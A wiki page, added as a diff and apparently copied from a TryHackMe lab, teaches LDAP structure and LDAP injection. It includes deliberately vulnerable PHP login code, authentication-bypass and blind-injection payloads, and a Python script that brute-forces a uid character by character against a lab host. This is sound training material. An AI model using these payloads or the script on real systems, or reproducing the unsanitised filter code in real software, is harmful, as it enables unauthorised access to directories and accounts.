@@ -1,0 +1,414 @@
+<!--
+title: LDAP injections
+description: 
+published: true
+date: 2026-09-29T11:32:58.454Z
+tags: 
+editor: ckeditor
+dateCreated: 2026-09-29T11:32:58.454Z
+-->
+
+<h1>Introduction</h1>
+<p>LDAP, which stands for Lightweight Directory Access Protocol, is a widely used protocol for accessing and maintaining distributed directory information services over an Internet Protocol (IP) network. LDAP enables organizations to manage users centrally, as well as groups and other directory information, often used for authentication and authorization purposes in web and internal applications.</p>
+<h3>Objectives</h3>
+<ol>
+  <li>Provide a thorough understanding of LDAP and its role in directory services.</li>
+  <li>Explore the LDAP tree structure and its key components.</li>
+  <li>Introduce LDAP Injection, its impact, and how it can be exploited.</li>
+  <li>Equip participants with the knowledge and skills to identify and mitigate LDAP Injection vulnerabilities.</li>
+</ol>
+<h3>Pre-requisites</h3>
+<ol>
+  <li>A foundational understanding of how directory services work, particularly LDAP.</li>
+  <li>Basic knowledge of web application security principles and common vulnerabilities.</li>
+  <li>Familiarity with the structure and components of LDAP, such as Distinguished Names (DNs) and attributes.</li>
+  <li>Experience with tools and techniques for security testing of web applications, such as <a href="https://tryhackme.com/room/learnowaspzap">OWASP ZAP</a> or <a href="https://tryhackme.com/module/learn-burp-suite">Burp Suite</a>.</li>
+</ol>
+<h1>Structure</h1>
+<p>In LDAP, directory entries are structured as objects, each adhering to a specific schema that defines the rules and attributes applicable to the object. This object-oriented approach ensures consistency and governs how objects like users or groups can be represented and manipulated within the directory.</p>
+<p><strong>Services that use LDAP</strong>:</p>
+<ul>
+  <li><strong>Microsoft Active Directory:</strong> A service for Windows domain networks, utilizing LDAP as part of its underlying protocol suite to manage domain resources.</li>
+  <li><strong>OpenLDAP:</strong> An open-source implementation of LDAP, widely used for managing user information and supporting authentication mechanisms across various platforms.</li>
+</ul>
+<h3>LDIF Format</h3>
+<p>LDAP entries can be represented using the LDAP Data Interchange Format (LDIF), a standard plain text data format for representing LDAP directory entries and update operations. LDIF imports and exports directory contents and describes directory modifications such as adding, modifying, or deleting entries.</p>
+<h3>Structure</h3>
+<p>An LDAP directory follows a hierarchical structure like a file system's tree. This structure comprises various entries representing a unique item, such as a user, group, or resource.</p>
+<figure class="image"><img src="https://cdn-images.tryhackme.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/f6e0e81b34c5e02559b27b192aba794a.png" alt="LDAP Structure"></figure>
+<p>At the top of the LDAP tree, we find the <strong>top-level domain (TLD)</strong>, such as <code>dc=ldap,dc=thm</code>. Beneath the TLD, there may be <strong>subdomains</strong> or <strong>organizational units (OUs)</strong>, such as <code>ou=people</code> or <code>ou=groups</code>, which further categorize the directory entries.</p>
+<ul>
+  <li><strong>Distinguished Names (DNs):</strong> Serve as unique identifiers for each entry in the directory, specifying the path from the top of the LDAP tree to the entry, for example, <code>cn=John Doe,ou=people,dc=example,dc=com</code>.</li>
+  <li><strong>Relative Distinguished Names (RDNs):</strong> Represent individual levels within the directory hierarchy, such as <code>cn=John Doe</code>, where <code>cn</code> stands for Common Name.</li>
+  <li><strong>Attributes:</strong> Define the properties of directory entries, like <code>mail=john@example.com</code> for an email address.</li>
+</ul>
+<h1>Search Queries</h1>
+<p>LDAP search queries are fundamental in interacting with LDAP directories, allowing you to locate and retrieve information stored within the directory. Understanding how to construct these queries is crucial for effectively utilizing LDAP services.</p>
+<p>An LDAP search query consists of several components, each serving a specific function in the search operation:</p>
+<ol>
+  <li><strong>Base DN (Distinguished Name):</strong> This is the search's starting point in the directory tree.</li>
+  <li><strong>Scope:</strong> Defines how deep the search should go from the base DN. It can be one of the following:<ul>
+      <li><code>base</code> (search the base DN only),</li>
+      <li><code>one</code> (search the immediate children of the base DN),</li>
+      <li><code>sub</code> (search the base DN and all its descendants).</li>
+    </ul>
+  </li>
+  <li><strong>Filter:</strong> A criteria entry must match to be returned in the search results. It uses a specific syntax to define these criteria.</li>
+  <li><strong>Attributes:</strong> Specifies which characteristics of the matching entries should be returned in the search results.</li>
+</ol>
+<p>The basic syntax for an LDAP search query looks like this:</p>
+<p>&nbsp;</p>
+<pre><code class="language-plaintext">(base DN) (scope) (filter) (attributes)
+</code></pre>
+<h3>Filters and Syntax</h3>
+<p>Filters are the core of LDAP search queries, defining the conditions that entries in the directory must meet to be included in the search results. The syntax for LDAP filters is defined in <a href="https://www.openldap.org/lists/ietf-ldapbis/200606/msg00010.html">RFC 4515 (opens in new tab)</a>, where filters are represented as strings with a specific format, such as <code>(canonicalName=value)</code>. LDAP filters can use a variety of operators to refine search criteria, including equality (<code>=</code>), presence (<code>=*</code>), greater than (<code>&gt;=</code>), and less than (<code>&lt;=</code>).</p>
+<p>One of the most essential operators in LDAP filters is the wildcard <code>*</code>, which signifies a match with any number of characters. This operator is crucial for formulating broad or partial-match search conditions.</p>
+<h3>Filter Examples</h3>
+<p><strong>Simple Filter:</strong></p>
+<p>&nbsp;</p>
+<pre><code class="language-plaintext">(cn=John Doe)
+</code></pre>
+<p>This filter targets entries with a canonical name (<code>cn</code>) exactly matching "John Doe".</p>
+<p><strong>Wildcards:</strong></p>
+<p>&nbsp;</p>
+<pre><code class="language-php">(cn=J*)
+</code></pre>
+<p>This filter applies the wildcard operator to match any entry where the <code>cn</code> begins with "J", regardless of what follows.</p>
+<p><strong>Complex Filters with Logical Operators:</strong></p>
+<p>For a more complex search query, filters can be used with each other using logical operators such as AND (<code>&amp;</code>), OR (<code>|</code>), and NOT (<code>!</code>).</p>
+<p>&nbsp;</p>
+<pre><code class="language-plaintext">(&amp;(objectClass=user)(|(cn=John*)(cn=Jane*)))
+</code></pre>
+<p>This filter searches for entries classified as "user" in their object class with a canonical name starting with either "John" or "Jane".</p>
+<p>While not commonly exposed directly, LDAP services can be accessible over the network via ports 389 (for unencrypted or StartTLS connections) and 636 (for SSL/TLS connections). When LDAP services are accessible publicly, tools such as <code>ldapsearch</code>, part of the OpenLDAP suite, can be used to interact with the LDAP server. This tool allows a user to query and modify the LDAP directory from the command line, making it a valuable resource for both legitimate administrative tasks and, potentially, for attackers exploiting LDAP Injection vulnerabilities. For example:</p>
+<p>&nbsp;</p>
+<p>Sample Search Query using ldapsearch</p>
+<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<code>user@tryhackme$ ldapsearch -x -H ldap://MACHINE_IP:389 -b "dc=ldap,dc=thm" "(ou=People)"
+    # extended LDIF
+    #
+    # LDAPv3
+    # base &lt;dc=ldap,dc=thm&gt; with scope subtree
+    # filter: (ou=People)
+    # requesting: ALL
+    #
+
+    # People, ldap.thm
+    dn: ou=People,dc=ldap,dc=thm
+    objectClass: organizationalUnit
+    objectClass: top
+    ou: People
+
+    # search result
+    search: 2
+    result: 0 Success
+
+    # numResponses: 2
+    # numEntries: 1</code>
+  &nbsp; &nbsp; &nbsp; &nbsp;</p>
+<p>This command uses <code>ldapsearch</code> to perform a search against an LDAP server located at the vulnerable machine on port 389, starting at the base DN <code>dc=ldap,dc=thm</code> and using a filter that will search for entries under the organizational unit of People.</p>
+<h1>Injection Fundamentals</h1>
+<p>LDAP Injection is a critical security vulnerability that occurs when user input is not properly sanitized before being incorporated into LDAP queries. This oversight allows attackers to manipulate these queries, leading to unauthorized access or manipulation of the LDAP directory data.</p>
+<p>LDAP Injection exploits the way web applications construct LDAP queries. When user input is directly included in these queries without proper validation or encoding, attackers can inject malicious LDAP statements. This can result in unauthorized access to sensitive information, modification of directory data, or bypassing authentication mechanisms.</p>
+<p>The process is analogous to SQL Injection, where malicious SQL statements are injected into queries to manipulate database operations. In LDAP Injection, the malicious code targets LDAP queries instead.</p>
+<h3>Common Attack Vectors</h3>
+<ol>
+  <li><strong>Authentication Bypass:</strong> Modifying LDAP authentication queries to log in as another user without knowing their password.</li>
+  <li><strong>Unauthorized Data Access:</strong> Altering LDAP search queries to retrieve sensitive information not intended for the attacker's access.</li>
+  <li><strong>Data Manipulation:</strong> Injecting queries that modify the LDAP directory, such as adding or modifying user attributes.</li>
+</ol>
+<h3>Injection Process</h3>
+<p>Making an LDAP Injection attack involves several key steps, from identifying the injection point to successfully exploiting the vulnerability.</p>
+<figure class="image image_resized" style="width:50%;"><img src="https://cdn-images.tryhackme.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/5813e9f3ac2fdcc629ec1b047a75cee1.png" alt="LDAP Injection Process"></figure>
+<p style="text-align:center;"><br>&nbsp;</p>
+<p>This diagram illustrates the interaction between the attacker, the web application, and the LDAP server during an LDAP Injection attack. The attacker submits malicious input to the web application login form, which constructs an LDAP query incorporating this input. The LDAP server then executes the altered query, leading to potential unauthorized access or information disclosure, depending on the nature of the injected payload.</p>
+<h1>Exploiting LDAP</h1>
+<p>LDAP Injection can be particularly dangerous when exploited within authentication mechanisms. Attackers can manipulate LDAP queries for user authentication to bypass security controls, gaining unauthorised access to applications.</p>
+<p>For example, below is a simplified PHP code snippet used in a web application for user authentication against an LDAP server:</p>
+<p>&nbsp;</p>
+<pre><code class="language-php">&lt;?php
+$username = $_POST['username'];
+$password = $_POST['password'];
+
+$ldap_server = "ldap://localhost";
+$ldap_dn = "ou=People,dc=ldap,dc=thm";
+$admin_dn = "cn=tester,dc=ldap,dc=thm";
+$admin_password = "tester"; 
+
+$ldap_conn = ldap_connect($ldap_server);
+if (!$ldap_conn) {
+    die("Could not connect to LDAP server");
+}
+
+ldap_set_option($ldap_conn, LDAP_OPT_PROTOCOL_VERSION, 3);
+
+if (!ldap_bind($ldap_conn, $admin_dn, $admin_password)) {
+    die("Could not bind to LDAP server with admin credentials");
+}
+
+// LDAP search filter
+$filter = "(&amp;(uid=$username)(userPassword=$password))";
+
+// Perform the LDAP search
+$search_result = ldap_search($ldap_conn, $ldap_dn, $filter);
+
+// Check if the search was successful
+if ($search_result) {
+    // Retrieve the entries from the search result
+    $entries = ldap_get_entries($ldap_conn, $search_result);
+    if ($entries['count'] &gt; 0) {
+        foreach ($entries as $entry) {
+            if (is_array($entry)) {
+                if (isset($entry['cn'][0])) {
+                    $message = "Welcome, " . $entry['cn'][0] . "!\n";
+                }
+            }
+        }
+    } else {
+        $error = true;
+    }
+} else {
+    $error = "LDAP search failed\n";
+}
+?&gt;
+</code></pre>
+<p>This code is vulnerable because it directly inserts user-supplied input (<code>$username</code> and <code>$password</code>) into the LDAP query without proper sanitisation or escaping. An attacker can exploit this to inject malicious LDAP filters.</p>
+<p>To exploit this vulnerability, an attacker can submit a username with a malicious LDAP filter. For example, the attacker could use a username like <code>*</code>, which, when inserted into the LDAP query, effectively turns the query into a condition that always evaluates to true, bypassing authentication.</p>
+<p>This query will authenticate successfully if there is any user in the LDAP directory, as the injected condition <code>uid=*</code> will always be evaluated to be true.</p>
+<h3>Authentication Bypass Techniques</h3>
+<p><strong>Tautology-Based Injection</strong></p>
+<p>Tautology-based injection involves inserting conditions into an LDAP query that are inherently true, thus ensuring the query always returns a positive result, irrespective of the intended logic. This method is particularly effective against LDAP queries constructed with user input that is not adequately sanitised. For example, consider an LDAP authentication query where the username and password are inserted directly from user input:</p>
+<p>&nbsp;</p>
+<pre><code class="language-php">(&amp;(uid={userInput})(userPassword={passwordInput}))
+</code></pre>
+<p>An attacker could provide a tautology-based input, such as <code>*)(|(&amp;</code>&nbsp;for <code>{userInput}</code>&nbsp;and <code>pwd)</code> for <code>{passwordInput}</code> which transforms the query into:</p>
+<p>&nbsp;</p>
+<pre><code class="language-php">(&amp;(uid=*)(|(&amp;)(userPassword=pwd)))
+</code></pre>
+<p>This query effectively bypasses password checking due to how logical operators are used within the filter. The query consists of two parts, combined using an AND (<code>&amp;</code>) operator.</p>
+<p><code>(uid=*)</code>: This part of the filter matches any entry with a <code>uid</code> attribute, essentially all users, because the wildcard <code>*</code> matches any value.</p>
+<p><code>(|(&amp;)(userPassword=pwd))</code>: The OR (<code>|</code>) operator, meaning that any of the two conditions enclosed needs to be true for the filter to pass. In LDAP, an empty AND (<code>(&amp;)</code>) condition is always considered true. The other condition checks if the <code>userPassword</code> attribute matches the value <code>pwd</code>, which can fail if the user is not using <code>pwd</code> as their password.</p>
+<p>Putting it all together, the second part of the filter <code>(|(&amp;)(userPassword=pwd))</code> will always be evaluated as true because of the <code>(&amp;)</code> condition. The OR operator only needs one of its enclosed conditions to be true, and since <code>(&amp;)</code> is always true, the entire OR condition is true regardless of whether <code>(userPassword=pwd)</code> is true or false.</p>
+<p>Therefore, this results in a successful query return for any user without verifying the correct password, bypassing the password-checking mechanism.</p>
+<p><strong>Wildcard Injection</strong></p>
+<p>Wildcards (<code>*</code>) are used in LDAP queries to match any sequence of characters, making them powerful tools for broad searches. However, when user input containing wildcards is not correctly sanitised, it can lead to unintended query results, such as bypassing authentication by matching multiple or all entries. For example, if the search query is like:</p>
+<p>&nbsp;</p>
+<pre><code class="language-php">(&amp;(uid={userInput})(userPassword={passwordInput}))
+</code></pre>
+<p>An attacker might use a wildcard as input in both uid and userPassword. Using a <code>*</code> for <code>{userInput}</code> could force the query to ignore specific usernames and focus instead on the password. However, since a wildcard is also present in the <code>{passwordInput}</code>, it does not validate the content of the password field against a specific expected value. Instead, it only checks for the presence of the <code>userPassword</code> attribute, regardless of its content.</p>
+<p>This means that the query will return a positive match for any user without verifying that the password provided during authentication matches the stored password. As a result, this effectively bypasses the password-checking mechanism.</p>
+<h3>Authentication Bypass Example</h3>
+<p>To demonstrate a simple LDAP Injection attack, go to <a href="http://MACHINE_IP/normal.php">http://MACHINE_IP/normal.php (opens in new tab)</a>. Based on the code above, the application constructs an LDAP query for authentication based on user input without proper sanitisation.</p>
+<p>An attacker can exploit this by submitting a username and password with a character the application does not anticipate, such as an asterisk (*) for the uid and userPassword attribute value. This makes the condition always evaluates to true, effectively bypassing the password check:</p>
+<p><strong>Injected Username and Password:</strong></p>
+<p>&nbsp;</p>
+<pre><code class="language-php">username=*&amp;password=*
+</code></pre>
+<figure class="image"><img src="https://cdn-images.tryhackme.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/8fc230d9a07a8adaa3fda06498fdf9dd.png" alt="Injected username and password"></figure>
+<p><br>&nbsp;</p>
+<p><strong>Resulting LDAP Query Component:</strong></p>
+<p>&nbsp;</p>
+<pre><code class="language-php">(&amp;(uid=*)(userPassword=*))
+</code></pre>
+<figure class="image"><img src="https://cdn-images.tryhackme.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/20b2a4f30e7b3880a934196393926ed3.png" alt="Resulting LDAP query component"></figure>
+<p><br>&nbsp;</p>
+<p>This injection always makes the LDAP query's condition true. However, using just the <code>*</code> will always fetch the first result in the query. To target the data beginning in a specific character, an attacker can use a payload like <code>f*</code>, which searches for a uid that begins with the letter f.</p>
+<figure class="image"><img src="https://cdn-images.tryhackme.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/3c98354e63406ae68366efa5d1dcf291.png" alt="Result showing the flag"></figure>
+<h1>Blind LDAP Injection</h1>
+<p>Blind LDAP Injection is a more subtle variant of LDAP Injection, where the attacker doesn't receive direct output from the injected payload. Instead, they must infer information based on the application's behaviour. This type of attack is more challenging but can still be used to extract sensitive information from an LDAP directory.</p>
+<p>Blind LDAP Injection requires a different approach due to the lack of explicit query results. Attackers must rely on indirect signs, such as changes in application behaviour, error messages, or response timings, to deduce the structure of the LDAP query and the existence of vulnerabilities.</p>
+<p>For example, below is the code snippet of <a href="http://MACHINE_IP/blind.php">http://MACHINE_IP/blind.php (opens in new tab)</a>&nbsp;that uses an LDAP query to check for the existence of a user but only returns a generic error message on failure. The application also checks if the submitted email is the same as the email in the database:</p>
+<p>&nbsp;</p>
+<pre><code class="language-php">$username = $_POST['username'];
+$password = $_POST['password'];
+
+$ldap_server = "ldap://localhost"; 
+$ldap_dn = "ou=users,dc=ldap,dc=thm";
+$admin_dn = "cn=tester,dc=ldap,dc=thm"; 
+$admin_password = "tester"; 
+
+$ldap_conn = ldap_connect($ldap_server);
+if (!$ldap_conn) {
+    die("Could not connect to LDAP server");
+}
+
+ldap_set_option($ldap_conn, LDAP_OPT_PROTOCOL_VERSION, 3);
+
+if (!ldap_bind($ldap_conn, $admin_dn, $admin_password)) {
+    die("Could not bind to LDAP server with admin credentials");
+}
+
+$filter = "(&amp;(uid=$username)(userPassword=$password))";
+$search_result = ldap_search($ldap_conn, $ldap_dn, $filter);
+
+if ($search_result) {
+   $entries = ldap_get_entries($ldap_conn, $search_result);
+    if ($entries['count'] &gt; 0) {
+        foreach ($entries as $entry) {
+            if (is_array($entry)) {
+                if (isset($entry['cn'][0])) {
+                    if($entry['uid'][0] === $_POST['username']){
+                        $message = "Welcome, " . $entry['cn'][0] . "!\n";
+                    }else{
+                        $message = "Something is wrong in your password.\n";
+                    }
+                }
+            }
+        }
+    } else {
+        $error = true;
+    }
+} else {
+    echo "LDAP search failed\n";
+}
+
+ldap_close($ldap_conn);
+</code></pre>
+<p>This code is vulnerable to Blind LDAP Injection because it constructs an LDAP filter using unsanitized user input.&nbsp;However, it only provides vague feedback, making it challenging to exploit directly.</p>
+<p>To exploit this vulnerability, an attacker can use a technique known as Boolean-based Blind LDAP Injection. The attacker injects conditions into the username field to make the LDAP query true or false, observing the application's behaviour to infer information.</p>
+<p>For example, an attacker might try injecting a username like <code>a*)(|(&amp;</code>, which, when included in the LDAP query, checks for any user with "a" in their uid exists:</p>
+<p><strong>Injected Username and Password:</strong></p>
+<p>&nbsp;</p>
+<pre><code class="language-plaintext">username=a*%29%28%7C%28%26&amp;password=pwd%29
+</code></pre>
+<p><strong>Note: </strong>The payload above is the URL-encoded version of the payload <code>a*)(|(&amp;</code> for username and <code>pwd)</code> for password. It must be URL-decoded first before using it.</p>
+<figure class="image"><img src="https://cdn-images.tryhackme.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/053b772823397558933f0b87b9d182ed.png" alt="Injected username and password"></figure>
+<p><br>&nbsp;</p>
+<p><strong>Resulting LDAP Query:</strong></p>
+<p>&nbsp;</p>
+<pre><code class="language-plaintext">(&amp;(uid=a*)(|(&amp;)(userPassword=pwd))) 
+</code></pre>
+<figure class="image"><img src="https://cdn-images.tryhackme.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/75795810cd9b19f32d96ff8d445f030b.png" alt="resulting LDAP query"></figure>
+<p><br>&nbsp;</p>
+<p>If the application returns "Something is wrong in your password", the attacker can infer that a user with an account that starts with "a" in their uid exists in the LDAP directory. To check for the next character, an attacker can reiterate the payload with the next character, for example:</p>
+<p><strong>Injected Username and Password:</strong></p>
+<p>&nbsp;</p>
+<pre><code class="language-php">username=ab*%29%28%7C%28%26&amp;password=pwd%29
+</code></pre>
+<figure class="image"><img src="https://cdn-images.tryhackme.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/33cde2b19ebe09a39013ef40d8bf3f85.png" alt="Second character injected in the payload"></figure>
+<p><br>&nbsp;</p>
+<p><strong>Resulting LDAP Query:</strong></p>
+<p>&nbsp;</p>
+<pre><code class="language-php">(&amp;(uid=ab*)(|(&amp;)(userPassword=pwd))) 
+</code></pre>
+<figure class="image"><img src="https://cdn-images.tryhackme.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/32e2c63e294e84663ee560f7cb6e14d5.png" alt="Resulting LDAP query of the second character"></figure>
+<p>This indicates that the next character is not "b". An attacker can automate this kind of check by iteratively guessing the characters of the email by observing the web application's behaviour in response to crafted input, similar to a Boolean-based SQL Injection attack.</p>
+<h3>Techniques for Extracting Information</h3>
+<ol>
+  <li><strong>Boolean Exploitation:</strong> This involves injecting conditions that are evaluated to be true or false and observing the application's response to infer data. For example, if the application behaves differently when the condition is true, the attacker can deduce that the injected condition matches an existing entry in the LDAP directory.</li>
+  <li><strong>Error-Based Inference:</strong> In some cases, specific injections might trigger error messages or peculiar application behaviour, providing clues about the LDAP structure or confirming the success of particular payloads.</li>
+</ol>
+<h1>Automating the attack</h1>
+<h3>Exploit Code</h3>
+<p>To automate the exfiltration of data in the previous task, you can use the Python script below:</p>
+<p>&nbsp;</p>
+<pre><code class="language-python">import requests
+from bs4 import BeautifulSoup
+import string
+import time
+
+# Base URL
+url = 'http://MACHINE_IP/blind.php'
+
+# Define the character set
+char_set = string.ascii_lowercase + string.ascii_uppercase + string.digits + "._!@#$%^&amp;*()"
+
+# Initialize variables
+successful_response_found = True
+successful_chars = ''
+
+headers = {
+    'Content-Type': 'application/x-www-form-urlencoded'
+}
+
+while successful_response_found:
+    successful_response_found = False
+
+    for char in char_set:
+        #print(f"Trying password character: {char}")
+
+        # Adjust data to target the password field
+        data = {'username': f'{successful_chars}{char}*)(|(&amp;','password': 'pwd)'}
+
+        # Send POST request with headers
+        response = requests.post(url, data=data, headers=headers)
+
+        # Parse HTML content
+        soup = BeautifulSoup(response.content, 'html.parser')
+
+        # Adjust success criteria as needed
+        paragraphs = soup.find_all('p', style='color: green;')
+
+        if paragraphs:
+            successful_response_found = True
+            successful_chars += char
+            print(f"Successful character found: {char}")
+            break
+
+    if not successful_response_found:
+        print("No successful character found in this iteration.")
+
+print(f"Final successful payload: {successful_chars}")
+</code></pre>
+<p><strong>Click here for a breakdown of the script.</strong></p>
+<ol>
+  <li>&nbsp;<ul>
+      <li>&nbsp;</li>
+      <li>&nbsp;</li>
+      <li>&nbsp;</li>
+      <li>&nbsp;</li>
+    </ul>
+  </li>
+  <li>&nbsp;<ul>
+      <li>&nbsp;</li>
+      <li>&nbsp;</li>
+    </ul>
+  </li>
+  <li>&nbsp;<ul>
+      <li>&nbsp;</li>
+      <li>&nbsp;</li>
+    </ul>
+  </li>
+  <li>&nbsp;<ul>
+      <li>&nbsp;</li>
+    </ul>
+  </li>
+  <li>&nbsp;<ul>
+      <li>&nbsp;</li>
+      <li>&nbsp;</li>
+    </ul>
+  </li>
+  <li>&nbsp;<ul>
+      <li>&nbsp;</li>
+      <li>&nbsp;</li>
+    </ul>
+  </li>
+  <li>&nbsp;<ul>
+      <li>&nbsp;</li>
+      <li>&nbsp;</li>
+    </ul>
+  </li>
+  <li>&nbsp;<ul>
+      <li>&nbsp;</li>
+      <li>&nbsp;</li>
+    </ul>
+  </li>
+  <li>&nbsp;<ul>
+      <li>&nbsp;</li>
+    </ul>
+  </li>
+</ol>
+<p>The above script iteratively guesses the characters of the email by observing the web application's behaviour in response to crafted input.</p>
+<h3>Automation</h3>
+<p>Save the Python code above. If you are using AttackBox, the required Python modules have already been installed. Make sure to use <code>python3.9</code> when using the AttackBox since there are multiple Python installations on it.</p>
+<p>Below is the sample command on how to run the automation script:</p>
+<p>&nbsp;</p>
+<p>~/Downloads</p>
+<p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<code>user@tryhackme$ ls
+    script.py
+    user@tryhackme$ python3.9 script.py</code>
+  &nbsp; &nbsp; &nbsp; &nbsp;</p>
+<p>This will immediately show the results of the brute force as shown below:</p>
+<figure class="image"><img src="https://cdn-images.tryhackme.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/f928c8f0afa797fe8627a17fa1f81352.png" alt="result of bruteforce attack"></figure>
+<p>Use the final payload to log in to&nbsp;<a href="http://MACHINE_IP/login.php">http://MACHINE_IP/login.php (opens in new tab)</a>. Make sure to use <code>*</code> as the password; this will automatically evaluate the search query as true.</p>
+<figure class="image"><img src="https://cdn-images.tryhackme.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/170c510494342b0e07b09f9225ea33f0.png" alt="Final payload in the search query"></figure>
+<figure class="image"><img src="https://cdn-images.tryhackme.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/13f3c3703d5bc9d94a7c60d0c657c598.png" alt="Dashboard containing the flag"></figure>
